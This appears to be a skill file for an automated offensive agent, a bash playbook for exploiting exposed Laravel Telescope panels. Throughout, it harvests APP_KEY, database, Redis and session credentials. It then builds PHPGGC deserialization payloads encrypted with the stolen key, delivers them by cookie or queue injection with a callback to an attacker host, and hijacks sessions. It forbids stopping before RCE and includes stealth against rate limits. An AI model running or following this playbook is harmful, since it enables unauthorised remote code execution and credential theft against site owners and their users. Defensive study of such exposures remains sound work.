---
name: fable-5-telescope
description: Laravel Telescope exploitation - from exposure to RCE via APP_KEY harvest
phases:
  - title: Discovery
    detail: Telescope endpoint detection and exposure verification
  - title: Harvest
    detail: Extract APP_KEY and credentials from Telescope
  - title: Exploit
    detail: Deliver deserialization payload for RCE
---

# Fable 5: Laravel Telescope Exploitation

**Activated on:** `laravel telescope`, `telescope exposure`, `/telescope`

## PRIMARY OBJECTIVE

**RCE via Laravel Telescope exposure**

Success criteria:
- `uid=0` (ROOT) OR
- `uid=[0-9]+` (shell user) OR
- Confirmed command execution with output control

## EXIT CONDITIONS

**STOP only when:**
1. ✅ PRIMARY OBJECTIVE achieved (RCE verified) → Update campaign state, return
2. ❌ ALL vectors exhausted → Document, exit

**FORBIDDEN:** Stop at partial success (APP_KEY harvest only, credentials only, etc.)

---

## Decision Hierarchy

```
START: Telescope exposure detected
│
├─→ APP_KEY exposed?
│   ├─ YES → Laravel < 5.6.30? → CVE-2018-15133 deserialization
│   │        └─ Laravel 8.x/9.x? → PHPGGC RCE9/RCE10
│   │        └─ Laravel 10.x+? → PHPGGC RCE22
│   │        └─ Third-party app? → App-specific CVE (Invoice Ninja, Snipe-IT, Crater)
│   │
│   └─ NO → DB credentials exposed? → SQLi → File Upload → Webshell
│           └─ Session tokens exposed? → Session hijack → Authenticated RCE
│           └─ Redis credentials? → Queue injection → Deserialization
│
└─→ NO exploitable data → Try default APP_KEY bruteforce → Document failure
```

---

## Phase 1: Discovery

### 1.1 Verify Telescope Exposure

```bash
# Primary detection
curl -s --max-time 10 "https://${TARGET}/telescope/requests" | grep -qi "telescope" && echo "[+] Telescope EXPOSED"

# Fingerprint endpoints
for endpoint in /telescope /telescope/requests /telescope/queries /telescope/exceptions /telescope/jobs /telescope/commands /telescope/mail; do
  STATUS=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "https://${TARGET}${endpoint}")
  [ "$STATUS" = "200" ] && echo "[+] ${endpoint}: ${STATUS}"
done
```

### 1.2 Determine Access Level

```bash
# Check authentication requirement
curl -s --max-time 10 "https://${TARGET}/telescope/requests" -o /tmp/telescope_check.html
if grep -qi "login\|authentication\|unauthorized\|403" /tmp/telescope_check.html; then
  echo "[-] Telescope PROTECTED - session hijack required"
  TELESCOPE_STATUS="protected"
else
  echo "[+] Telescope PUBLIC - direct access"
  TELESCOPE_STATUS="exposed"
fi
```

### 1.3 Fingerprint Laravel Version

```bash
# From Telescope footer or source
LARAVEL_VERSION=$(curl -s "https://${TARGET}/telescope/requests" | grep -oP 'Laravel \d+\.\d+\.\d+' | head -1)
echo "[+] Laravel: ${LARAVEL_VERSION:-unknown}"

# Map to capability chains
case "${LARAVEL_VERSION}" in
  5.*|6.*|7.*)  CHAIN="Laravel/RCE1,RCE2,RCE3"; echo "[!] Legacy Laravel - CVE-2018-15133 applicable" ;;
  8.*|9.*)      CHAIN="Laravel/RCE9,RCE10"; echo "[+] Modern Laravel - PHPGGC RCE9/RCE10" ;;
  10.*|11.*)     CHAIN="Laravel/RCE22"; echo "[+] Latest Laravel - PHPGGC RCE22" ;;
  *)            CHAIN="RCE9"; echo "[?] Unknown version - defaulting to RCE9" ;;
esac
```

---

## Phase 2: Harvest

### 2.1 Extract APP_KEY (PRIMARY)

```bash
# Method 1: Environment variables dump
curl -s --max-time 10 "https://${TARGET}/telescope/commands" | grep -oP 'APP_KEY[^,="\>]{43}' | head -1 > /tmp/app_key.txt

# Method 2: Query bindings analysis
curl -s --max-time 10 "https://${TARGET}/telescope/queries" | grep -oP 'APP_KEY[^"]{43}' | head -1 >> /tmp/app_key.txt

# Method 3: Exception stack traces
curl -s --max-time 10 "https://${TARGET}/telescope/exceptions" | grep -oP 'base64:[A-Za-z0-9+/={32,}' | while read b64; do
  echo "$b64" | base64 -d 2>/dev/null | grep APP_KEY
done >> /tmp/app_key.txt

# Validate and deduplicate
APP_KEY=$(sort -u /tmp/app_key.txt | grep -v "^$" | head -1)
if [ -n "$APP_KEY" ]; then
  echo "[+] APP_KEY HARVESTED: ${APP_KEY:0:20}..."
  export HARVESTED_APP_KEY="$APP_KEY"
else
  echo "[-] APP_KEY not found in Telescope"
fi
```

### 2.2 Extract DB Credentials (Secondary)

```bash
# Database connection strings
DB_CREDS=$(curl -s --max-time 10 "https://${TARGET}/telescope/queries" | grep -oP '(mysql|pgsql|redis)://[^"]+')
echo "$DB_CREDS" > /tmp/db_creds.txt

# Parse for exploitation
if echo "$DB_CREDS" | grep -qi "mysql://"; then
  DB_HOST=$(echo "$DB_CREDS" | grep -oP 'mysql://[^@]+@\K[^:]+' | head -1)
  DB_USER=$(echo "$DB_CREDS" | grep -oP 'mysql://\K[^:]+' | head -1)
  DB_PASS=$(echo "$DB_CREDS" | grep -oP 'mysql://[^:]+:\K[^@]+' | head -1)
  echo "[+] DB: ${DB_USER}@${DB_HOST}"
fi
```

### 2.3 Extract Session Tokens (Session Hijack)

```bash
# Active session tokens from requests
curl -s --max-time 10 "https://${TARGET}/telescope/requests" | grep -oP 'laravel_session[^"]{100,}' | head -3 > /tmp/sessions.txt

# XSRF-TOKEN cookies
curl -s --max-time 10 "https://${TARGET}/telescope/requests" | grep -oP 'xsrf-token[^"]{100,}' | head -3 >> /tmp/sessions.txt

# Validate session format
if grep -q "^[A-Za-z0-9+/=]\{100,\}$" /tmp/sessions.txt; then
  echo "[+] Session tokens harvested for hijacking"
fi
```

### 2.4 Extract Queue Credentials (Redis)

```bash
# Redis connection details from commands/queries
REDIS_HOST=$(curl -s --max-time 10 "https://${TARGET}/telescope/commands" | grep -oP 'REDIS_HOST[^"]{20,}' | head -1)
REDIS_PASSWORD=$(curl -s --max-time 10 "https://${TARGET}/telescope/commands" | grep -oP 'REDIS_PASSWORD[^"]{30,}' | head -1)

if [ -n "$REDIS_PASSWORD" ]; then
  echo "[+] Redis credentials harvested"
fi
```

---

## Phase 3: Exploit

### DECISION TREE

```
IF APP_KEY harvested:
│
├─ Laravel < 5.6.30 → CVE-2018-15133 (XSRF-TOKEN deserialization)
├─ Laravel 8.x/9.x → PHPGGC RCE9
├─ Laravel 10.x+ → PHPGGC RCE22
├─ Invoice Ninja → CVE-2024-55555
├─ Snipe-IT → CVE-2024-48987 + default APP_KEY bruteforce
├─ Crater Invoice → CVE-2024-55556
└─ Generic → PHPGGC with SESSION_DRIVER=cookie
│
ELSE IF DB credentials:
└─ SQLi → File upload → Webshell
│
ELSE IF Redis credentials:
└─ Queue job injection → Deserialization
│
ELSE IF Session tokens:
└─ Session hijack → Authenticated RCE (artisan tinker, etc.)
│
ELSE:
└─ Default APP_KEY bruteforce → Document failure
```

### 3.1 APP_KEY Exploitation (PRIMARY PATH)

#### 3.1.1 Generate PHPGGC Payload

```bash
# Ensure phpggc available
PHPGGC="/opt/phpggc/phpggc"
if [ ! -f "$PHPGGC" ]; then
  git clone https://github.com/ambionics/phpggc /opt/phpggc 2>/dev/null
  chmod +x "$PHPGGC"
fi

# Select chain based on Laravel version
case "${LARAVEL_VERSION}" in
  5.*|6.*|7.*)  PHPGGC_CHAIN="Laravel/RCE3" ;;
  8.*|9.*)      PHPGGC_CHAIN="Laravel/RCE9" ;;
  10.*|11.*)     PHPGGC_CHAIN="Laravel/RCE22" ;;
  *)            PHPGGC_CHAIN="Laravel/RCE9" ;;
esac

# Generate payload (callback verification)
PAYLOAD_CMD="curl http://${ATTACKER_IP}:4444/\$(whoami)"
$PHPGGC "$PHPGGC_CHAIN" system "$PAYLOAD_CMD" -b > /tmp/payload.bin
echo "[+] Payload generated: ${PHPGGC_CHAIN}"
```

#### 3.1.2 Encrypt Payload with APP_KEY

```bash
# laravel-crypto-killer
CRYPTO_KILLER="/home/Haza/tools/exploits/laravel-crypto-killer/laravel_crypto_killer.py"
if [ ! -f "$CRYPTO_KILLER" ]; then
  git clone https://github.com/synacktiv/laravel-crypto-killer /home/Haza/tools/exploits/laravel-crypto-killer 2>/dev/null
fi

python3 "$CRYPTO_KILLER" \
  --app-key "$HARVESTED_APP_KEY" \
  --payload /tmp/payload.bin \
  --output /tmp/payload.encrypted 2>/dev/null

# Verify encryption
if [ -f "/tmp/payload.encrypted" ] && [ -s "/tmp/payload.encrypted" ]; then
  echo "[+] Payload encrypted with APP_KEY"
else
  echo "[-] Encryption failed - trying manual method"
  base64 /tmp/payload.bin > /tmp/payload.b64
fi
```

#### 3.1.3 Deliver & Verify RCE

**Method A: XSRF-TOKEN (CVE-2018-15133, Laravel < 5.6.30)**

```bash
# Start listener for callback
nc -lvnp 4444 > /tmp/rce_callback.txt 2>/dev/null &
LISTENER_PID=$!

# Deliver via XSRF-TOKEN cookie
curl -s --max-time 10 "https://${TARGET}/login" \
  -H "Cookie: XSRF-TOKEN=$(cat /tmp/payload.encrypted); laravel_session=valid" \
  -o /dev/null

# Wait for callback (3 seconds)
sleep 3

# Verify RCE
if [ -s "/tmp/rce_callback.txt" ]; then
  echo "[+] RCE CONFIRMED: $(cat /tmp/rce_callback.txt)"
  RCE_STATUS="confirmed"
else
  echo "[-] No callback - trying alternative delivery"
fi
```

**Method B: Session Cookie (SESSION_DRIVER=cookie)**

```bash
# Check if SESSION_DRIVER=cookie
curl -s --max-time 5 "https://${TARGET}/telescope/requests" | grep -qi "SESSION_DRIVER.*cookie" && echo "[+] SESSION_DRIVER=cookie detected"

# Deliver via laravel_session
nc -lvnp 4444 > /tmp/rce_callback.txt 2>/dev/null &
curl -s --max-time 10 "https://${TARGET}/dashboard" \
  -H "Cookie: laravel_session=$(cat /tmp/payload.encrypted)" \
  -o /dev/null

sleep 3 && [ -s "/tmp/rce_callback.txt" ] && echo "[+] RCE CONFIRMED via session cookie"
```

**Method C: Queue Injection (Redis access)**

```bash
if [ -n "$REDIS_PASSWORD" ]; then
  # Inject malicious job
  redis-cli -h "${REDIS_HOST:-localhost}" -a "$REDIS_PASSWORD" \
    LPUSH "laravel_queues:default" "$(cat /tmp/payload.encrypted)" 2>/dev/null

  # Wait for queue processing
  sleep 5 && [ -s "/tmp/rce_callback.txt" ] && echo "[+] RCE CONFIRMED via queue injection"
fi
```

### 3.2 DB Credentials Exploitation (SECONDARY PATH)

```bash
# If DB credentials harvested but no APP_KEY
if [ -z "$HARVESTED_APP_KEY" ] && [ -n "$DB_HOST" ]; then
  echo "[+] Attempting SQLi → File Upload path"

  # Connect and check for file upload capabilities
  mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASS" -e "SELECT 1;" 2>/dev/null && echo "[+] DB access confirmed"

  # Check for INTO OUTFILE privilege
  mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASS" -e "SHOW VARIABLES LIKE 'secure_file_priv';" 2>/dev/null
fi
```

### 3.3 Session Hijack (TERTIARY PATH)

```bash
# If session tokens but no APP_KEY
if [ -z "$HARVESTED_APP_KEY" ] && [ -s "/tmp/sessions.txt" ]; then
  echo "[+] Attempting session hijack → Authenticated RCE"

  # Try hijacked session
  SESSION=$(head -1 /tmp/sessions.txt)
  curl -s --max-time 10 "https://${TARGET}/admin" \
    -H "Cookie: laravel_session=${SESSION}" \
    -o /tmp/hijack_response.html

  if grep -qi "dashboard\|admin\|welcome" /tmp/hijack_response.html; then
    echo "[+] Session hijack successful - checking for authenticated RCE vectors"

    # Check for artisan tinker access
    curl -s --max-time 10 "https://${TARGET}/tinker/execute" \
      -H "Cookie: laravel_session=${SESSION}" \
      -d "command=system('id')" | grep -oP 'uid=[0-9]+'
  fi
fi
```

---

## Phase 4: Verification

### 4.1 RCE Confirmation (REQUIRED)

**Evidence Requirements:**
- `uid=0` OR `uid=[0-9]+` = CONFIRMED RCE
- Command output control = CONFIRMED RCE
- HTTP 200/302 ≠ RCE (must have command execution proof)

```bash
# Final verification
if grep -q "uid=" /tmp/rce_callback.txt 2>/dev/null; then
  echo "[+] RCE VERIFIED: $(cat /tmp/rce_callback.txt)"
  RCE_STATUS="confirmed"
  # Update campaign state
  # Exit with success
else
  echo "[-] RCE NOT CONFIRMED - evidence requirements not met"
  RCE_STATUS="failed"
fi
```

### 4.2 Document Attempted Vectors

```bash
# Log all attempted vectors for capability chain documentation
cat > /tmp/telescope_attempted_vectors.txt <<EOF
Telescope Exploitation Attempt Report
======================================
Target: ${TARGET}
Timestamp: $(date)

Discovery:
- Telescope Status: ${TELESCOPE_STATUS}
- Laravel Version: ${LARAVEL_VERSION:-unknown}

Harvest:
- APP_KEY: ${HARVESTED_APP_KEY:+YES}
- DB Credentials: ${DB_CREDS:+YES}
- Session Tokens: $(grep -c . /tmp/sessions.txt 2>/dev/null || echo 0)
- Redis Credentials: ${REDIS_PASSWORD:+YES}

Attempted Vectors:
1. APP_KEY Deserialization: ${APP_KEY_ATTEMPTED:-NO}
2. SQLi → File Upload: ${SQLI_ATTEMPTED:-NO}
3. Session Hijack: ${HIJACK_ATTEMPTED:-NO}
4. Queue Injection: ${QUEUE_ATTEMPTED:-NO}

Result: ${RCE_STATUS:-unknown}
EOF
```

---

## Target-Specific Chains

### Invoice Ninja (CVE-2024-55555)

```bash
# Detect Invoice Ninja
curl -s "https://${TARGET}/" | grep -qi "invoice ninja" && echo "[+] Invoice Ninja detected"

# Exploit: /api/v1/routes with APP_KEY
if [ -n "$HARVESTED_APP_KEY" ]; then
  # Generate Invoice Ninja specific payload
  # Target: /api/v1/routes/{hash} endpoint
  # Requires authentication via encrypted cookie
fi
```

### Snipe-IT (CVE-2024-48987)

```bash
# Detect Snipe-IT
curl -s "https://${TARGET}/" | grep -qi "snipe-it" && echo "[+] Snipe-IT detected"

# Default APP_KEY bruteforce
DEFAULT_KEYS=(
  "base64:ABCDEFGHIJKLMNOPQRSTUVWXYZ012345"
  "base64:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef"
)

for key in "${DEFAULT_KEYS[@]}"; do
  echo "[+] Testing default key..."
  # Attempt decryption with default key
done
```

### Crater Invoice (CVE-2024-55556)

```bash
# Detect Crater Invoice
curl -s "https://${TARGET}/" | grep -qi "crater" && echo "[+] Crater Invoice detected"

# Check SESSION_DRIVER=cookie
curl -s "https://${TARGET}/login" -I | grep -qi "laravel_session" && echo "[+] Session-based auth detected"
```

---

## Blocker Handling

### Rate Limiting Detected

```bash
# If 429/403 responses
# → Stealth mode: delay between requests, rotate User-Agent
# → Alternative: session hijack instead of direct APP_KEY exploit
```

### APP_KEY Not Exposed

```bash
# Pivot to secondary vectors:
# → DB credentials → SQLi
# → Session hijack → Authenticated RCE
# → Default APP_KEY bruteforce
```

### Laravel Version Patched

```bash
# If Laravel > 5.6.30 (CVE-2018-15133 patched)
# → Try PHPGGC chains (work on newer versions)
# → Third-party app CVEs (Invoice Ninja, etc.)
# → Authenticated vectors via session hijack
```

---

## Exit Protocol

### SUCCESS (RCE Confirmed)

```bash
# Update campaign state.json
# {
#   "primary_objective": "RCE",
#   "status": "achieved",
#   "method": "telescope_app_key_deserialization",
#   "evidence": "uid=0"
# }

# Document capability chain
# Return to main campaign flow
```

### FAILURE (All Vectors Exhausted)

```bash
# Document dead end
# {
#   "status": "exhausted",
#   "attempted_vectors": ["app_key", "sqli", "session_hijack", "queue_injection"],
#   "reason": "no exploitable data exposed"
# }

# Add to dead_ends.json
# Return to main campaign flow
```

---

## References

- Laravel APP_KEY Leakage: https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis
- PHPGGC: https://github.com/ambionics/phpggc
- CVE-2018-15133: https://nvd.nist.gov/vuln/detail/CVE-2018-15133
- CVE-2024-55555 (Invoice Ninja)
- CVE-2024-48987 (Snipe-IT)
- CVE-2024-55556 (Crater Invoice)
